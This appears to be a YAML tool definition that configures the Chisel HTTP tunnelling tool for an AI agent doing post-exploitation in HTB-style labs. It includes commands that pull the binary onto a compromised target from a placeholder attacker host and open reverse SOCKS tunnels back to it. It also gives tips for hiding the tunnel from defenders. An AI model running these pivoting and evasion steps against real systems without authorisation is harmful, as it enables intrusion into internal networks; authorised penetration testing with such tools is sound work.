name: chisel
kind: cli
binary: chisel
version: "1.11.4"
description: "HTTP-based tunneling and SOCKS5 proxy via Chisel v1.11.4 (jpillora/chisel) — single Go binary, two subcommands (server, client). Used for engagement-lifetime tunnels when SSH is blocked but HTTP/HTTPS is open: agent runs chisel server in a persistent kind:cli container, target downloads + runs chisel client connecting back to the server with R:<port>:socks reverse-SOCKS spec. The server's fingerprint (base64 SHA256 of ECDSA public key) appears in stderr at startup and goes to the client's --fingerprint flag for MITM protection. Per-engagement use is single-server (1 container holds for max_runtime_seconds) — for SSH-based tunneling prefer the `ssh` (kind:cli v3.0) ControlMaster + tunnel-flag patterns since they don't require a server-side process on the agent."
image: "ghcr.io/silicon-works/mcp-tools-chisel:latest"
image_size_mb: 205

# Engagement-lifetime tunnel — chisel server holds for hours.
idle_timeout_seconds: 600
max_runtime_seconds: 86400
timeout_seconds: 86400

capabilities:
  - http_tunneling
  - port_forwarding
  - reverse_tunneling
  - socks5_proxy
  - pivoting
  - tls_tunneling

phases:
  - post-exploitation

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 128
  cpu: 0.25

routing:
  use_for:
    - "create HTTP-based tunnel when SSH port is blocked but HTTP/HTTPS is open"
    - "establish SOCKS5 proxy through compromised host for pivoting into internal networks via HTTP"
    - "tunnel through web proxies and firewalls that only allow HTTP/HTTPS"
    - "set up a chisel server with --reverse to receive reverse-shell-style tunnels from a compromised target"
    - "pivot through a compromised host to reach internal network segments via HTTP tunnel"
    - "hide chisel traffic behind a legitimate website using --backend reverse proxy"
    - "run chisel client (agent-side) to connect to a known chisel server elsewhere for forward / SOCKS tunneling"
  never_use_for:
    - "SSH tunneling when SSH is available — use the `ssh` tool's ControlMaster + tunnel-flag patterns (no server process needed)"
    - "port scanning through a tunnel (use nmap with proxychains after SOCKS is established)"
    - "file transfer (use scp via ssh ControlMaster, or curl via tunnel)"
    - "reverse shell listeners (use `nc` v2.0 held-listener pipeline pattern)"
    - "IPsec VPN connections (use ike-scan for VPN discovery first; chisel is per-port tunneling)"
  triggers:
    - "chisel"
    - "HTTP tunnel"
    - "HTTPS tunnel"
    - "WebSocket tunnel"
    - "reverse tunnel HTTP"
    - "SOCKS over HTTP"
    - "firewall bypass tunnel"
    - "pivot HTTP"
    - "chisel server"
    - "chisel client"
  prefer_over: []

see_also:
  - tool: ssh
    reason: "Prefer `ssh` (kind:cli v3.0) ControlMaster + tunnel-flag patterns (-L / -D / -R) when SSH is available. chisel has the added cost of needing a server process on the agent + client binary on the target — only worth that overhead when SSH is blocked. The legacy `tunnel` (kind:mcp) tool was retired May 2026; SSH-based tunneling lives in ssh now."
  - tool: nc
    reason: "Use `nc` v2.0 for raw reverse shell listeners (held-listener pipeline pattern); chisel is for tunneling, NOT shell holding. Once a foothold yields a reverse shell on nc, agent can upload chisel binary via the held shell, then run `chisel client http://attacker:port R:1080:socks` from inside the target shell."
  - tool: nmap
    reason: "After establishing a chisel SOCKS proxy at localhost:1080, scan internal hosts via `proxychains -f /tmp/pc.conf nmap ...` with pc.conf containing `socks5 127.0.0.1 1080`."
  - tool: curl
    reason: "Once SOCKS is up, curl --socks5 127.0.0.1:1080 https://internal/ reaches internal services through the tunnel — verified empirically 2026-05-10."

target_extraction: []
reject_flags: []
reject_flags_reason: "chisel server takes no remote-target arg (it's a local listener). chisel client takes a server URL — that's the only target-shaped argument. No reject_flags apply."

usage_patterns:

  - name: "Pattern C1 — chisel server (engagement-lifetime SOCKS/reverse listener)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/chisel && chisel server --reverse --socks5 --host 0.0.0.0 --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log'"
    when: "Start a chisel server that listens for client connections over HTTP/WebSocket. Defaults enable --reverse (allow target to push reverse tunnels back) and --socks5 (allow target to expose SOCKS5 endpoint). The `2>&1 | tee` captures both stdout AND stderr (chisel writes the Fingerprint to stderr) to /session/output/chisel/server-<port>.log so a separate tool-runner spawn can extract the fingerprint via `grep -oE 'Fingerprint [a-zA-Z0-9/+=]+' /session/output/chisel/server-<port>.log | awk '{print $2}'`. Container holds for max_runtime_seconds (24h default). Plugin defaults to --network=host so the chisel port (8080 etc.) is reachable from tun0 / target's network. Verified empirically 2026-05-10: fingerprint emitted within <2s of startup, length 44 (base64-encoded SHA256)."

  - name: "Pattern C2 — extract fingerprint from server log (for client --fingerprint)"
    binary: "bash"
    command: "-c 'grep -oE \"Fingerprint [a-zA-Z0-9/+=]+\" /session/output/chisel/server-<port>.log | head -1 | awk \"{print \\$2}\"'"
    when: "After Pattern C1 has started, extract the server's ECDSA public-key fingerprint (44 chars base64) from the log. The output is the value the agent passes to the target's chisel client invocation as `--fingerprint <value>` for MITM protection. The fingerprint stays stable for the server's lifetime — capture once on startup, reuse for any client connections to this same server. Returns empty if server hasn't started yet (race) — Pattern C1's sleep+grep loop avoids this."

  - name: "Pattern C3 — chisel client (agent-side, connect to remote chisel server)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/chisel && chisel client --fingerprint <server_fingerprint> http://<server_host>:<server_port> <remote_spec> 2>&1 | tee /session/output/chisel/client-<id>.log'"
    when: "Run the AGENT as a chisel client connecting to a known chisel server elsewhere. <remote_spec> is one of: (a) `<local-port>` for forward (server-side->local), (b) `R:<remote-port>:<host>:<port>` for reverse, (c) `<local-port>:socks` for SOCKS through the server. Less common than C1 since HTB-style flows usually run server agent-side + client on the target. <id> is something like 'forward-9999' or 'socks-1080' so the log filename is unique. Auto-reconnect built into chisel."

  - name: "Pattern C4 — time-bounded chisel server (early termination via timeout prefix)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/chisel && timeout <seconds> chisel server --reverse --socks5 --host 0.0.0.0 --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log; echo \"chisel exited after <seconds>s\" >> /session/output/chisel/server-<port>.log'"
    when: "Cap the chisel server's lifetime to <seconds> (e.g. 3600 for a 1h window). Useful when an engagement phase wraps up earlier than max_runtime_seconds (24h). The `timeout` coreutil sends SIGTERM after <seconds>s — chisel exits cleanly + the container terminates. For server-stays-up-forever flow, omit this pattern and use C1 (max_runtime_seconds is the kill switch). NOTE: there is NO 'docker kill' style early-close path from within cli_in_container — the chisel image has no docker CLI, and even with it there's no socket access. The two real close mechanisms are: (1) this `timeout` prefix at spawn, (2) max_runtime_seconds cap. Replaces the legacy wrapper's `close <id>` and `force_restart` methods."

  - name: "Pattern C5 — list active chisel processes via filesystem"
    binary: "bash"
    command: "-c 'ls -la /session/output/chisel/ 2>/dev/null'"
    when: "Enumerate active chisel processes by their log files. Each Pattern C1 / C3 invocation writes server-<port>.log or client-<id>.log to /session/output/chisel/. Empty / missing dir = no active processes. Replaces the legacy wrapper's `list` method. Filesystem-tracked, no in-memory dict — agent reads it on-demand from any tool-runner spawn."

  - name: "Pattern C6 — chisel server with persistent ECDSA key (stable fingerprint across restarts)"
    binary: "bash"
    command: "-c 'mkdir -p /session/output/chisel && chisel server --reverse --socks5 --keyfile /session/output/chisel/server.key --port <port> 2>&1 | tee /session/output/chisel/server-<port>.log'"
    when: "Use --keyfile to load a persistent ECDSA private key so the server's fingerprint is stable across container restarts (instead of being regenerated each startup). Agent pre-generates the key via `chisel server --keygen /session/output/chisel/server.key` ONCE (single short-running call, server exits after keygen). Then C6 starts the server with --keyfile. NOTE: this is about KEY PERSISTENCE for fingerprint stability, NOT TLS-on-the-wire — chisel's WebSocket transport with --keyfile is still over plain HTTP. For HTTPS-wrapped chisel (TLS-on-the-wire), use a separate spawn with `--tls-cert /session/output/chisel/cert.pem --tls-key /session/output/chisel/key.pem` (caller pre-generates cert+key with openssl); these wrap the outer transport in HTTPS. The two features are independent: --keyfile gives stable fingerprint; --tls-cert/--tls-key give TLS transport."

output_formats:
  - flag: ""
    format: "text"
    preferred: true
    notes: "chisel writes all output to stderr (server startup, client connections, errors). Recipe pipes 2>&1 | tee to /session/output/chisel/<id>.log for downstream parsing. Fingerprint line shape: `<timestamp> server: Fingerprint <base64-44-chars>`."

common_options:
  server:
    - "--port, -p PORT: HTTP listening port (default 8080). Use 80 or 443 to blend with normal web traffic."
    - "--host HOST: bind interface (default 0.0.0.0)"
    - "--reverse: allow clients to use R: reverse port forwarding (recommended ON for HTB pivoting)"
    - "--socks5: enable internal SOCKS5 proxy for clients (recommended ON for pivoting)"
    - "--auth user:pass: enforce single-user authentication"
    - "--authfile PATH: multi-user authentication via JSON file (object keyed by user:pass with per-user remote-address regex allowlists; auto-reloads on change). Use for multi-operator engagements where each operator gets restricted tunnel destinations."
    - "--keepalive 25s: HTTP keepalive interval. Default 25s. Critical when traversing corporate HTTP proxies that close idle connections — set to 5s-15s for aggressive proxies, 0s disables. Both sides should match."
    - "--backend URL: proxy non-chisel HTTP requests to a real backend (hides chisel behind a legitimate website)"
    - "--keygen PATH: write a new ECDSA private key to PATH (run once, then reuse with --keyfile)"
    - "--keyfile PATH: use a persistent ECDSA key — fingerprint stays stable across restarts"
    - "--tls-cert PATH, --tls-key PATH: wrap chisel in HTTPS (need separate cert+key generated via openssl). Both required together; cannot combine with --tls-domain."
    - "--tls-domain DOMAIN: LetsEncrypt auto-cert path. Requires port 443 + a real public domain pointed at the agent. Resulting certs cached at $HOME/.cache/chisel (or CHISEL_LE_CACHE env). Stealth deployments where chisel poses as a legitimate HTTPS service."
    - "--tls-ca PATH: PEM CA bundle to validate client TLS certs (mutual TLS server side). Pair with client's --tls-cert/--tls-key for mTLS authentication."
    - "-v: verbose logging"
  client:
    - "--fingerprint FP: required for MITM protection — pass server's fingerprint from Pattern C2"
    - "--auth user:pass: match server's --auth (or one of server's --authfile entries)"
    - "--header NAME: VALUE: custom HTTP header (e.g. for CDN bypass). Repeatable."
    - "--hostname HOST: override the HTTP Host header (defaults to URL host). Different from --header — sets the bare Host, useful for vhost-routed CDNs."
    - "--sni HOST: override TLS ServerName Indication (defaults to URL hostname). Useful for fronting via CDN edges that route by SNI."
    - "--proxy URL: route client traffic through an HTTP CONNECT or SOCKS5 proxy to reach the chisel server (e.g. http://user:pass@proxy:8081 or socks://user:pass@proxy:1080)"
    - "--keepalive 25s: HTTP keepalive interval. Default 25s. Match server's setting."
    - "--max-retry-count N: cap retries (chisel default unlimited — set explicitly for fail-fast scenarios). 0 disables retries."
    - "--max-retry-interval DURATION: cap reconnect backoff. Default 5m. Lower (e.g. 30s) for engagements where slow reconnects mask outages."
    - "--tls-ca PATH: trust this CA bundle instead of system roots when connecting via https/wss. Pair with server using LE staging or private CA."
    - "--tls-skip-verify: accept any TLS cert (chain + hostname). For lab/HTB self-signed certs. Does NOT bypass --fingerprint check on the inner connection — keep fingerprint validation even with skip-verify."
    - "--tls-cert PATH, --tls-key PATH: client cert + key for mutual-TLS authentication (pair with server's --tls-ca)."
    - "-v: verbose logging"
    - "remote spec FORWARD: <lport>:<rhost>:<rport>/tcp|udp (default tcp). Examples: `3000:google.com:80`, `192.168.0.5:3000:internal.lan:80`, `5353:1.1.1.1:53/udp` (DNS over UDP via tunnel)."
    - "remote spec REVERSE (server listens, forwards to client): R:<rport>:<lhost>:<lport>. Server must have --reverse. Example: R:2222:localhost:22 (expose client's SSH on server:2222)."
    - "remote spec SOCKS through server: `<lport>:socks` (default 1080:socks). Server must have --socks5. Local port becomes SOCKS5 entry, server's network becomes SOCKS exit."
    - "remote spec REVERSE SOCKS (canonical HTB pivot): R:<rport>:socks (e.g. R:1080:socks). Server-side port becomes SOCKS5 entry, client's network (= compromised target's reachable subnet) becomes the SOCKS exit. Most common pattern for proxychains pivoting."
    - "remote spec STDIO mode (single connection, no port binding): stdio:<rhost>:<rport>. Connects this chisel client's stdin/stdout to the remote address. Designed for `ssh -o ProxyCommand='chisel client http://server stdio:%h:%p'` chained-pivot flows where you want one SSH connection through chisel without exposing a local port."

gotchas:
  - "ENGAGEMENT-LIFETIME DAEMON (not time-bounded). chisel server runs FOREVER — max_runtime_seconds is the cli_in_container kill switch (default 24h). For shorter sessions, prefix with `timeout NN`. Unlike responder (always wrapped with timeout for capture window), chisel typically runs the full engagement duration so the default max_runtime is appropriate."
  - "FINGERPRINT EXTRACTION: chisel server emits 'Fingerprint <base64-44>' on stderr at startup (within ~2s). Recipe captures via `2>&1 | tee /session/output/chisel/server-<port>.log` so a separate tool-runner spawn can grep it later. Grep recipe: `grep -oE 'Fingerprint [a-zA-Z0-9/+=]+' /session/output/chisel/server-<port>.log | head -1 | awk '{print $2}'`. The fingerprint contains base64 chars including `/`, `+`, `=` — use [a-zA-Z0-9/+=]+ in regex, NOT [a-zA-Z0-9:]+ (the latter cuts at `/`)."
  - "FINGERPRINT REGENERATION: by default chisel server generates a NEW ECDSA key each startup, so fingerprint CHANGES between restarts. For stable fingerprint across restarts (when target's chisel client has a hardcoded --fingerprint), pre-generate via `chisel server --keygen /session/output/chisel/server.key` ONCE, then run subsequent servers with `--keyfile /session/output/chisel/server.key` (Pattern C6). The keygen call short-exits — does NOT start a server. Useful when the engagement spans multiple agent sessions / container restarts."
  - "AGENT-SIDE vs TARGET-SIDE chisel — HTB typical: agent runs SERVER (Pattern C1) in a persistent kind:cli container; agent uploads chisel binary to compromised target via existing reverse shell (nc held-listener) or scp (ssh ControlMaster); target's shell runs `chisel client http://<attacker>:8080 R:1080:socks --fingerprint <fp>` from inside the held shell — this is NOT a cli_in_container invocation, it's a command sent into the target's shell. The R:1080:socks pattern exposes the target's network as a SOCKS proxy on attacker's localhost:1080."
  - "DOWNLOAD CHISEL TO TARGET: target needs the chisel binary. Three common flows: (1) `wget http://<attacker>:8000/chisel` if agent serves it via `python3 -m http.server` (use the `nc` tool's http-file-server usage_pattern), (2) `scp` via ssh ControlMaster if SSH is available, (3) base64-encoded write through the held shell if file transfer paths are blocked. The agent's own chisel binary is at /usr/local/bin/chisel inside the chisel container — copy it out to /session/output/chisel/chisel-bin first via `cp /usr/local/bin/chisel /session/output/chisel/chisel-bin` to make it available for upload."
  - "PORT REACHABILITY across containers: plugin defaults to --network=host (manager.ts:382) so chisel server's port (e.g. 18080) is reachable from sibling tool-runner spawn containers as `127.0.0.1:18080`. Verified empirically 2026-05-10 — separate container's curl --socks5 127.0.0.1:11080 fetched example.com via the tunnel correctly. NO cross-container port mapping needed; --network=host handles it."
  - "SOCKS REACHABILITY for proxychains: once Pattern C1 server + target-side client are running with R:1080:socks remote spec, the agent's tools (nmap, curl, sqlmap, ssh) can use proxychains to route through the tunnel. proxychains config: `socks5 127.0.0.1 1080` (server's R: rebound the target-side SOCKS to attacker's 1080). Verify connectivity with `nc -zv 127.0.0.1 1080` from a sibling spawn before relying on the route."
  - "CLOSE / EARLY-TERMINATE A CHISEL SERVER: there is NO `docker kill` path available from inside cli_in_container — the chisel image has no docker CLI, and even if it did there's no socket access. Two real close mechanisms: (1) Pattern C4 — prefix spawn with `timeout <seconds>` for a fixed window; (2) wait for max_runtime_seconds (24h default) to expire. Both replace the legacy wrapper's `close` and `force_restart` methods. When the chisel server exits (either path), any clients connecting through it auto-retry via chisel's exponential backoff until they give up (~5min)."
  - "LIST ACTIVE PROCESSES: `ls /session/output/chisel/` shows log files (server-<port>.log + client-<id>.log) for each spawn. Each Pattern C1 / C3 invocation persists its log file. Replaces the legacy wrapper's `list` method — filesystem-tracked instead of in-memory dict, so any sibling spawn can enumerate."
  - "DON'T CONFUSE WITH ssh TUNNEL: when SSH is available, ssh kind:cli v3.0 Patterns T1/T2/T3 (-L/-D/-R via ControlMaster) are the right tool — no server-side process needed, faster setup, more reliable on modern targets. Only use chisel when port 22 is blocked outbound from the target / inbound to attacker but HTTP is open. The legacy `tunnel` (kind:mcp) tool was retired May 2026 — all SSH-tunneling absorbed into ssh."
  - "RECONNECT BEHAVIOR (built-in): chisel client auto-reconnects with exponential backoff (100ms→5min). If the server container dies + restarts, the client picks up automatically (within minutes). BUT: if the server's --keyfile is NOT persistent, the fingerprint CHANGES on restart and the client rejects the new server (fingerprint mismatch). For stable reconnect across restarts, ALWAYS use --keyfile per gotcha #3."
  - "BACKEND PROXY (--backend) HIDES CHISEL: useful for engagements where a tunnel exposed on port 80 would tip off defenders. `chisel server --backend http://example.com:80` proxies non-chisel HTTP requests to example.com — any web crawler hitting the chisel port sees a normal site. The chisel WebSocket upgrade path is the only entry. Increases stealth but adds latency."
  - "TARGET ARCHITECTURE: image ships chisel for linux_amd64 only (at /usr/local/bin/chisel). 32-bit targets need chisel_<ver>_linux_386 (verified live 2026-05-11 on HTB Lame i686 — upload of amd64 binary failed with 'cannot execute binary file'). ARM targets need linux_arm64 or linux_arm. Agent detects target arch via `uname -m` from the target's held shell, then downloads the right binary from `https://github.com/jpillora/chisel/releases/download/v1.11.4/chisel_1.11.4_linux_<arch>.gz` (use the `nc` HTTP file server pattern to host it OR scp via ssh ControlMaster)."
  - "TARGET KERNEL VERSION: chisel is built with modern Go (1.25+) which requires Linux kernel ≥ 2.6.32 (~2009). Targets older than that (Ubuntu 8.04 LTS / RHEL 5 era / Lame's 2.6.24) crash on goroutine setup with `golang.org/x/sync/errgroup.(*Group).Go` stack trace. Verified failure mode on HTB Lame 2026-05-11. Modern engagement targets (any 2010+ Linux) are unaffected. For Lame-class ancient targets, fall back to ssh tunnel patterns (ssh kind:cli v3.0 -L/-D/-R) or static-Go chisel built for older kernels (out of scope here)."
  - "STALE LOG FILES (filesystem-state caveat): /session/output/chisel/server-<port>.log persists forever in the bind-mount even after the chisel server exits — there's no auto-prune (the legacy wrapper's `list` method did this in-memory). Pattern C5's `ls` shows historical AND current spawns. To know if a tunnel is ACTUALLY alive, probe it from a sibling spawn: `nc -zv 127.0.0.1 <port>` (using --network=host). Stale log + dead port = the chisel process has exited (max_runtime hit, network drop, kill). The log's last line often reveals why: `Listening on...` then EOF means clean exit; stack trace means crash."
  - "NO AUTO-PICK FREE LOCAL PORT: legacy wrapper accepted local_port=0 to auto-pick; kind:cli doesn't. Agent must pick a port at spawn time (recommend 18080+ for server, 11080+ for SOCKS local-end to avoid colliding with common services). If collision: bind fails with `address already in use`; agent retries with N+1. Documented in failure_signatures."
  - "PROCESS SIGNALS (SIGUSR2 + SIGHUP): chisel listens for SIGUSR2 (print process stats to stderr — appears in /session/output/chisel/<id>.log within seconds) and SIGHUP (short-circuit the reconnect timer — force immediate reconnect on a client, useful when waiting out the 5min max-retry-interval backoff after a network blip). Trigger from a sibling spawn that joins the SAME container's PID namespace — NOT available across cli_in_container spawns since each is its own container. Workaround: signal via `docker kill -s SIGHUP <container-name>` from outside (requires host-level docker access, not from inside cli_in_container)."

failure_signatures:
  - signal: "bind: address already in use"
    layer: "tcp"
    remediation: "Another process (likely a previous chisel server, or a host service since --network=host shares the agent's net stack) is bound to the port. Easiest fix: pick a different port (chisel server --port N+1). To clear a stale chisel server, wait for its max_runtime_seconds to expire (24h default), or re-spawn with Pattern C4's `timeout <seconds>` prefix so the next one self-terminates."
  - signal: "Fingerprint mismatch"
    layer: "auth"
    remediation: "Client's --fingerprint doesn't match the server's current fingerprint. Either: (a) server restarted without --keyfile and regenerated its key — re-extract fingerprint via Pattern C2 and update client; (b) man-in-the-middle (rare on lab/HTB) — re-check the chain. Use Pattern C6 (--keyfile persistence) to prevent re-key on restart."
  - signal: "connection refused"
    layer: "tcp"
    remediation: "Client can't reach server. Check: (1) server actually running (`ls /session/output/chisel/server-<port>.log` shows recent activity), (2) target host's outbound HTTP not blocked, (3) attacker's <port> actually exposed externally (in HTB / tun0 context this is the user's tun0 IP, not 127.0.0.1)."
  - signal: "tls: failed to verify certificate"
    layer: "tls"
    remediation: "When using --tls-cert / --tls-key on server, client needs to trust the cert. Two options: (a) `--tls-ca <ca-bundle.pem>` to pin a specific CA (production-grade); (b) `--tls-skip-verify` to accept ANY TLS cert chain (lab/HTB self-signed, still validates --fingerprint on the inner connection). Flag is `--tls-ca` NOT `--ca-cert` (verified against chisel v1.11.4 client --help)."
  - signal: "EOF on tunnel"
    layer: "transport"
    remediation: "Server died or network dropped. chisel client auto-retries with exponential backoff — wait up to 5min. To verify server status from a sibling cli_in_container spawn: `ls -la /session/output/chisel/server-<port>.log` for recent activity, or `nc -zv 127.0.0.1 <port>` to probe the listener (use --network=host). Restart server with Pattern C1 + re-extract fingerprint via Pattern C2 if needed."

help_commands:
  - name: "chisel — top-level help"
    binary: "chisel"
    command: "--help"
    when: "Print chisel's top-level usage. target=null."
  - name: "chisel — server subcommand help"
    binary: "chisel"
    command: "server --help"
    when: "Print full chisel server flag list. target=null."
  - name: "chisel — client subcommand help"
    binary: "chisel"
    command: "client --help"
    when: "Print full chisel client flag list including remote spec syntax. target=null."
